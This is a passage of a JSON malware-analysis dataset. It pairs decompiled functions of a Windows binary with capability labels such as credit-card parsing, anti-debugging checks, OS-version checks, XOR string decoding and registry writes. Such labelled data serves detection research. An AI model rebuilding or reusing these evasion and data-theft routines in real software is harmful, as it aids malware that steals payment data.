        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038ed) overlaps instruction at (ram,0x004038eb)\n// \n\nvoid __cdecl fcn.00403890(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    int32_t unaff_EDI;\n    \n    iVar3 = 0;\n    if (0 < arg_14h) {\n        do {\n            uVar1 = *(iVar3 + arg_10h);\n            uVar2 = *(iVar3 % arg_ch + arg_8h);\n            *(unaff_EDI + 0x57) = *(unaff_EDI + 0x57) - &stack0xfffffff0;\n            *(iVar3 + arg_10h) = arg_14h ^ uVar1 ^ uVar2;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00403a60": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403b9f) overlaps instruction at (ram,0x00403b9b)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403a60(int16_t *arg_8h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    int32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    uint var_4h;\n    \n    if (*arg_8h + 0xa5b3U != 0) {\n        return 0;\n    }\n    piVar4 = arg_8h;\n    if ((POPCOUNT(*arg_8h + 0xa5b3U & 0xff) & 1U) != 0) {\n        piVar4 = (arg_8h >> 8 & 0xffff00) << 8 | arg_8h & 0xffff;\n    }\n    if (*(*(piVar4 + 0x1e) + piVar4) != 0x4550) {\n        return 0;\n    }\n    if ((*(piVar4 + 0x1e) + piVar4)[0x16] != 0) {\n        return 0;\n    }\n    if ((!SCARRY4(unaff_EBX, 1)) && (SCARRY4(unaff_EBX, 1))) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    puVar8 = *(arg_8h + 0x1e) - 0x80;\n    if (0xbf < *(arg_8h + 0x1e)) {\n        puVar8 = 0x40;\n    }\n    puVar2 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar8);\n    pcVar1 = _sym.imp.MSVCRT.dll_rand;\n    bVar9 = puVar2 == NULL;\n    if (!bVar9) {\n        if ((!bVar9) && (bVar9)) {\n            *puVar8 = *unaff_ESI;\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        puVar6 = NULL;\n        if (puVar8 != NULL) {\n            do {\n                iVar3 = (*pcVar1)();\n                puVar7 = puVar6 + 1;\n                *(puVar6 + puVar2) = iVar3 % 0xff;\n                puVar6 = puVar7;\n            } while (puVar7 < puVar8);\n        }\n        puVar6 = puVar2;\n        puVar7 = arg_8h + 0x40;\n        for (uVar5 = puVar8 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        for (uVar5 = puVar8 & 3; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar7 = *puVar6;\n            puVar6 = puVar6 + 1;\n            puVar7 = puVar7 + 1;\n        }\n        *puVar7 = *puVar6;\n        puVar2[-1] = 0x403c31;\n        sub.MSVCRT.dll_void___cdecl_operator_delete_void__();\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 890
    },
    "004040a0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nint32_t fcn.004040a0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00401320": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401320(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00403fd0(0x80000002, 0x4071d8, 0x407224, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 133
    },
    "00402740": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00402740(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 119
    },
    "00402870": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004028d3) overlaps instruction at (ram,0x004028d2)\n// \n// WARNING: Removing unreachable block (ram,0x004028d0)\n\nuint __cdecl fcn.00402870(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(*0x10 + -0x164, 0x708c, arg_8h);\n    (*pcVar2)(*0x10 + -0x268, 0x70a4, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x4070cc;\n    var_30h = 0x4070d8;\n    var_2ch = 0x4070e4;\n    var_28h = 0x4070f4;\n    var_24h = 0x4070fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1145
    },
    "00403f30": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403f30(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403d30(&var_68h, &var_4h);\n    fcn.00403690(&var_68h, var_4h, 0x411768, 0x12000);\n    *arg_8h = 0x411768;\n    *arg_ch = 0x12000;\n    return;\n}\n",
        "token_count": 254
    },
    "00403fd0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040402d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00403fd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 177
    },
    "004041f0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040427b) overlaps instruction at (ram,0x00404279)\n// \n\nbool fcn.004041f0(uint32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uchar *puVar7;\n    uint *unaff_ESI;\n    uint32_t *puVar8;\n    uint *unaff_EDI;\n    uint *puVar9;\n    uint *puVar10;\n    bool bVar11;\n    uint64_t uVar12;\n    unkuint6 Var13;\n    uint32_t uStack40;\n    \n    uStack40 = param_1;\n    Var13 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    uVar6 = Var13 >> 0x20;\n    bVar11 = SCARRY4(&uStack40, 4);\n    puVar7 = &stack0xfffffffc;\n    if ((bVar11) || (puVar7 = &stack0xfffffffc,  !bVar11)) {\ncode_r0x0040422b:\n        *(puVar7 + -0xc) = 0x407448;\n        *(puVar7 + -8) = 0x407450;\n        *(puVar7 + -4) = 0x407458;\n        if ((bVar11) || (!bVar11)) {\n            puVar9 = NULL;\n            puVar8 = puVar7 + -0x14;\n        }\n        else {\n            puVar8 = unaff_ESI + 1;\n            *unaff_EDI = *unaff_ESI;\n            in(0xff33);\n            puVar9 = unaff_EDI + 1;\n        }\n        do {\n            uStack40 = *puVar8;\n            uVar12 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n            if (uVar12 != 0) {\n                return true;\n            }\n            puVar10 = puVar9 + 1;\n            puVar8 = puVar8 + 1;\n            bVar11 = puVar9 + -1 < 0;\n            puVar9 = puVar10;\n        } while (puVar10 < 0x5);\n        if (!bVar11) goto code_r0x00404273;\n    }\n    else {\n        uVar2 = in(uVar6);\n        iVar3 = (Var13 & 0xffffff00 | uVar2) + 1;\n        if (iVar3 != 0) {\n            param_1 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) + iVar3, param_1);\n            LOCK();\n            bVar11 = SBORROW1(*(iVar3 * 3), uVar6 >> 8);\n            puVar7 = &stack0xfffffffd;\n            goto code_r0x0040422b;\n        }\n        uVar1 = iVar3 ^ *(unaff_EDI + -0x7d);\n        *(param_1 + uVar1 * 4) = 0xff;\n        puVar4 = uVar1 + 0x880fe672;\n        uVar12 = Var13 & 0xffff00000000 | ZEXT46(puVar4);\n        *puVar4 = *puVar4 | puVar4;\n        *puVar4 = *puVar4 + puVar4;\n        bVar11 = *puVar4 < '\\0';\ncode_r0x00404273:\n        if (bVar11) {\n            puVar4 = param_1 - 1;\n            uVar2 = *puVar4;\n            uVar5 = uVar12 >> 0x20;\n            *puVar4 = *puVar4 + uVar5;\n            iVar3 = uVar12 + CARRY1(uVar2, uVar5) + 0x40b49140;\n            goto code_r0x00404287;\n        }\n    }\n    uStack40 = 0x407430;\n    iVar3 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\ncode_r0x00404287:\n    return iVar3 == 0;\n}\n",
        "token_count": 943
    },
    "00401710": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017b5) overlaps instruction at (ram,0x004017b3)\n// \n// WARNING: Removing unreachable block (ram,0x00401756)\n// WARNING: Removing unreachable block (ram,0x0040176b)\n\nvoid __cdecl fcn.00401710(uint32_t arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    char cVar4;\n    uint32_t uVar3;\n    uint16_t uVar5;\n    uint32_t extraout_ECX;\n    uint32_t uVar6;\n    char *pcVar7;\n    uint16_t uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t unaff_EDI;\n    bool bVar11;\n    uint8_t in_AF;\n    bool in_SF;\n    ulong uVar12;\n    \n    if ((in_SF) || (!in_SF)) {\n        unaff_EDI = arg_ch;\n    }\n    uVar3 = fcn.00402c00(0, arg_8h, unaff_EDI + 1U >> 1);\n    puVar9 = uVar3 & 0xffff;\n    bVar11 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    uVar12 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    pcVar7 = uVar12 >> 0x20;\n    uVar3 = uVar12;\n    if ((bVar11) || (!bVar11)) {\n        uVar6 = *(uVar3 + 0x58);\n    }\n    else {\n        out(*puVar9, uVar12 >> 0x20);\n        do {\n            cVar4 = uVar3 >> 8;\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar3 = CONCAT31(CONCAT21(uVar3 >> 0x10, cVar4 - in_AF), -in_AF);\n        } while (in_AF || cVar4 == *pcVar7);\n        piVar1 = unaff_EDI + pcVar7 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - in_AF;\n        *(extraout_ECX - 0x75) = uVar3;\n        uVar3 = arg_8h & 0xffff | puVar9 << 0x10;\n        uVar6 = extraout_ECX;\n        puVar9 = puVar9 + 1;\n    }\n    uVar5 = uVar6;\n    uVar8 = puVar9;\n    if (uVar8 < uVar5) {\n        if ((uVar5 < uVar8) && (uVar8 <= uVar5)) {\n            *(unaff_EDI + 0x2b) = *(unaff_EDI + 0x2b) - &stack0xfffffff0;\n            pcVar2 = swi(1);\n            (*pcVar2)();\n            return;\n        }\n        iVar10 = (puVar9 - uVar6 & 0xffff) - 1;\n    }\n    else {\n        iVar10 = puVar9 - (uVar6 & 0xffff);\n    }\n    if (iVar10 < uVar6 >> 0x10) {\n        iVar10 = (iVar10 - (uVar6 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar10 = iVar10 - (uVar6 >> 0x10);\n    }\n    *arg_14h = iVar10 + unaff_EDI;\n    *arg_10h = *(uVar3 + 0x58);\n    return;\n}\n",
        "token_count": 843
    },
    "00402c00": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c18) overlaps instruction at (ram,0x00402c16)\n// \n\nuint32_t __thiscall fcn.00402c00(uint32_t param_1, uint32_t param_2)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint16_t *puVar3;\n    char **ppcVar4;\n    uint *puVar5;\n    char **ppcVar6;\n    char *unaff_ESI;\n    uint32_t uVar7;\n    uint8_t *unaff_EDI;\n    bool bVar8;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    char *apcStack16 [3];\n    \n    puVar5 = &stack0xfffffffc;\n    if ((in_OF != in_SF) ||\n       (apcStack16[2] = apcStack16[2] & 0xffff | param_1 << 0x10,  uVar2 = param_1,  in_OF == in_SF)) {\n        if (in_ZF || in_OF != in_SF) goto code_r0x00402c2b;\n        apcStack16[2] = apcStack16[2] & 0xffff | unaff_ESI << 0x10;\n        uVar2 = param_2;\n    }\n    param_2 = uVar2;\n    puVar5 = apcStack16 + 0xb;\n    *unaff_EDI = *unaff_EDI | param_2;\n    *unaff_ESI = *unaff_ESI + unaff_ESI;\n    *(in_EAX + 0x56) = *(in_EAX + 0x56) + (unaff_ESI >> 8);\n    unaff_ESI = in_EAX & 0xffff0000 | apcStack16[2] >> 0x10;\ncode_r0x00402c2b:\n    uVar2 = puVar5[4];\n    puVar3 = puVar5[3];\n    bVar8 = false;\n    if (uVar2 != 0) {\n        apcStack16[2] = unaff_ESI;\n        uVar7 = uVar2;\n        do {\n            if ((!bVar8) && (bVar8)) {\n                out(0xbd, uVar2);\n                return uVar2;\n            }\n            param_2 = param_2 + *puVar3;\n            uVar2 = param_2 >> 0x10;\n            bVar8 = param_2 >> 0x10 != 0;\n            ppcVar6 = puVar5;\n            if (bVar8) {\n                if ((bVar8) && (!bVar8)) {\n                    ppcVar4 = apcStack16 + 1;\n                    ppcVar6 = apcStack16 + 1;\n                    cVar1 = '\\x10';\n                    do {\n                        puVar5 = puVar5 + -1;\n                        ppcVar4 = ppcVar4 + -1;\n                        *ppcVar4 = *puVar5;\n                        cVar1 = cVar1 + -1;\n                    } while ('\\0' < cVar1);\n                }\n                uVar2 = uVar2 + (param_2 & 0xffff);\n                param_2 = uVar2;\n            }\n            bVar8 = 0xfffffffd < puVar3;\n            puVar3 = puVar3 + 1;\n            uVar7 = uVar7 - 1;\n            puVar5 = ppcVar6;\n        } while (uVar7 != 0);\n    }\n    return (param_2 >> 0x10) + param_2;\n}\n",
        "token_count": 822
    },
    "00401830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00401830(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint extraout_EDX;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    uint *puVar3;\n    bool bVar4;\n    uint var_314h;\n    uint uStack784;\n    uint uStack776;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    bVar4 = SCARRY4(unaff_EBX, 1);\n    fcn.00403790();\n    if ((!bVar4) && (bVar4)) {\n        *unaff_EDI = uStack776;\n        return CONCAT44(uStack784, uStack776);\n    }\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004040a0();\n        arg_ch_01 = fcn.004040a0();\n        arg_ch_02 = fcn.004040a0();\n        fcn.004026e0(arg_10h, arg_ch_00);\n        fcn.004026e0(arg_8h, arg_ch_01);\n        fcn.004026e0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.00404c70(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.00404c70(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.00404c70(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004026e0(arg_14h, 4);\n    return CONCAT44(extraout_EDX, iVar2 != 0);\n}\n",
        "token_count": 719
    },
    "00404900": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404a48) overlaps instruction at (ram,0x00404a46)\n// \n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404900(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uchar lpszPath;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_14h;\n    uint hProcess;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402450();\n    iVar4 = fcn.00404100();\n    if (iVar4 != 0) {\n        lpszPath = 0;\n        puVar5 = &var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        *puVar5 = 0;\n        *(puVar5 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)(0, &lpszPath, 0x26, 0);\n        if (iVar4 != 0) {\n            fcn.00403790();\n            s = 0;\n            puVar5 = &var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            *puVar5 = 0;\n            *(puVar5 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x4073ac, &lpszPath, 0x40738c, 3);\n            pcVar3 = _sym.imp.USER32.dll_EnumWindows;\n            pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n            var_14h = 0;\n            do {\n                puVar5 = &var_58h;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar5 = 0;\n                    puVar5 = puVar5 + 1;\n                }\n                var_28h._0_2_ = 0;\n                hProcess = 0;\n                var_ch = 0;\n                var_58h = 0x44;\n                var_8h = 0;\n                var_2ch = 1;\n                var_4h = 0;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)\n                                  (0, &s, &var_58h, &var_58h, &var_58h, &var_58h, &var_58h, &var_58h, 0, \n                                   &stack0xfffffffc);\n                if (iVar4 == 0) {\n                    return;\n                }\n                (*pcVar2)(3000);\n                (*pcVar3)(fcn.00404800, var_8h);\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hProcess, 1000);\n                if (iVar4 == 0x102) {\n                    (*_sym.imp.KERNEL32.dll_TerminateProcess)(hProcess, 1);\n                }\n                pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_ch);\n                (*pcVar1)(hProcess);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 875
    },
    "004020c0": {
        "rules": [
            "check for PEB NtGlobalFlag flag/02e6ad6983154968a9ea3bb4adc24b9d/10fcbce0171842839e4e3d1dbc7c6301"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004023f8) overlaps instruction at (ram,0x004023f7)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nulong fcn.004020c0(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    ushort extraout_CX;\n    ushort uVar6;\n    uint32_t extraout_ECX;\n    uint32_t uVar7;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar9;\n    uint extraout_EDX_01;\n    uint16_t unaff_BX;\n    uint *puVar10;\n    uint *unaff_EBP;\n    uint32_t unaff_ESI;\n    uint16_t in_SS;\n    uint16_t uVar11;\n    bool bVar12;\n    char cVar13;\n    bool bVar14;\n    char cVar15;\n    ulong uVar16;\n    uint unaff_retaddr;\n    uchar in_stack_ffffffce;\n    uchar in_stack_ffffffcf;\n    unkbyte3 Var18;\n    uint uVar17;\n    uchar uVar19;\n    unkbyte3 Var20;\n    uint arg_10h;\n    uchar uVar21;\n    uchar uVar22;\n    char cVar8;\n    \n    uVar7 = unaff_ESI;\n    fcn.00403890(0x407490, 0x11, 0x407010, 0x11);\n    fcn.00403890(0x407490, 0x11, 0x40722c, 0xf);\n    fcn.00403890(0x407490, 0x11, 0x40723c, 0x1a);\n    fcn.00403890(0x407490, 0x11, 0x407290, 10);\n    fcn.00403890(0x407490, 0x11, 0x40729c, 0xb);\n    fcn.00403890(0x407490, 0x11, 0x4072a8, 8);\n    bVar14 = false;\n    uVar19 = 0;\n    Var18 = 0x407490;\n    fcn.00403890(0x407490, 0x11, 0x4072b0, 9);\n    if ((!bVar14) && (bVar14)) {\n        *CONCAT13(uVar19, Var18) = unaff_retaddr;\n        return CONCAT44(uVar7, unaff_retaddr);\n    }\n    uVar22 = 9;\n    uVar6 = 0;\n    uVar17 = 0;\n    uVar21 = 0;\n    Var18 = 0x11;\n    Var20 = 0x4072bc;\n    uVar19 = 0;\n    while( true ) {\n        fcn.00403890(0x407490, CONCAT13(uVar19, Var18), CONCAT13(uVar21, Var20), \n                     CONCAT13(uVar17, CONCAT21(uVar6, uVar22)));\n        uVar7 = CONCAT13(in_stack_ffffffcf, CONCAT12(in_stack_ffffffce, in_SS));\n        in_stack_ffffffce = 0;\n        in_stack_ffffffcf = 0;\n        bVar14 = false;\n        uVar11 = in_SS;\n        puVar4 = fcn.00403890(0x407490, 0x11, 0x4072c8, 0x47);\n        if ((bVar14) || (uVar7 = uVar7 & 0xffff0000 | in_SS,  !bVar14)) break;\n        Var18 = 0xf8c08b;\n        uVar19 = 0xb7;\n        in_SS = uVar11;\n        if (&stack0xffffffc0 < *puVar4 || puVar4 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar5 = fcn.00403890(0x407490, 0x11, 0x4072d4, 0xc);\n    bVar14 = false;\n    bVar12 = (uVar7 & uVar5) == 0;\n    uVar19 = 0x90;\n    uVar6 = 0x4074;\n    uVar21 = 0;\n    fcn.00403890(0x407490, 0x11, 0x4072e0, 3);\n    if ((!bVar14 && !bVar12) && (bVar14 || bVar12)) {\n        unaff_ESI = CONCAT13(uVar21, CONCAT21(uVar6, uVar19));\n    }\n    fcn.00403890(0x407490, 0x11, 0x4072e4, 10);\n    fcn.00403890(0x407490, 0x11, 0x4072f0, 0x40);\n    fcn.00403890(0x407490, 0x11, 0x407330, 0xc);\n    arg_10h = 0x40733c;\n    uVar17 = 0x11;\n    fcn.00403890(0x407490, 0x11, 0x40733c, 0x47);\n    fcn.00403890(0x407490, 0x11, 0x407348, 4);\n    iVar3 = fcn.00403890(0x407490, 0x11, 0x40734c, 4);\n    uVar2 = (unaff_BX ^ 0x70c5) - iVar3 >> 8 | extraout_CX >> 8;\n    cVar15 = SBORROW1(uVar2, extraout_CX);\n    cVar13 = uVar2 - extraout_CX < '\\0';\n    uVar19 = 0x9d;\n    uVar21 = 0x23;\n    fcn.00403890(0x407490, 0x11, 0x407350, 0xc);\n    uVar7 = extraout_ECX;\n    if (cVar15 == cVar13) {\n        uVar6 = extraout_ECX;\n        uVar7 = extraout_ECX & 0xffff;\n        cVar8 = uVar7 >> 8;\n        if (cVar15 == cVar13) goto code_r0x004023b2;\n        uVar2 = unaff_ESI + 0x68;\n        if (0x97 < unaff_ESI) goto code_r0x004023b8;\n        iVar9 = extraout_EDX;\n        if (-1 < uVar2) {\n            pcVar1 = extraout_EDX + 0x736c6816 + unaff_EBP * 2;\n            *pcVar1 = *pcVar1 + '@' + CARRY1(uVar17 >> 8, *(unaff_ESI & 0xffffff00 | uVar2));\n            *(extraout_EDX + 0x11) = *(extraout_EDX + 0x11) + cVar8;\n            goto code_r0x00402408;\n        }\n    }\n    else {\ncode_r0x004023b2:\n        cVar8 = uVar7 >> 8;\n        uVar19 = 4;\n        uVar21 = 0;\n        uVar6 = 0;\n        arg_10h = 0x40735c;\n        uVar17 = 